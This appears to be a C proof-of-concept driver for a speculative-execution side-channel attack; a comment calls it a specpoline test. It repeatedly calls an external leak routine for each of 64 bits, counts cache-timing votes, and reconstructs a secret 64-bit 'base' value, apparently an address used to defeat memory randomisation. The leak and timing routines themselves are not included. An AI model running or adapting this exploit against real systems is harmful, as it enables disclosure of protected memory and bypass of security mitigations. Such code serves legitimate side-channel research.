#include <stdio.h>
#include <limits.h>
#include <string.h>

#if CHAR_BIT != 8
    #error CHAR_BIT MUST BE 8
#endif


extern unsigned int timings[256];
extern void leak(unsigned int off);

void vote(unsigned int* vote0, unsigned int* vote1)
{
    unsigned int i;
    unsigned int locations[] = {0, 1, 2,  127, 128, 129};
    

    for (i = 0; i < sizeof(locations)/sizeof(locations[0]); i++)
    {
        if (timings[locations[i]] >= 120)
            continue;

        (*(i < 3 ? vote0 : vote1))++;
    }
}




int main()
{
    unsigned int i = 0, bit;
    unsigned long long base=0;
    unsigned int votes0, votes1;

    for (bit = 0; bit < 64; bit++)
    {
        votes0 = votes1 = 0;
        i = 0;
        
        /* Test specpoline */
        while (i++ < 100)
        {    
          leak(bit);
          vote(&votes0, &votes1);
        }

        //printf("Bit %d: %d vs %d\n", bit, votes0, votes1);

        if (votes1 > votes0)
            base |= (1ULL << bit);
    }



    /* Show results */
    printf("Base: %016llx\n\n", base); 

    return 0;    
}
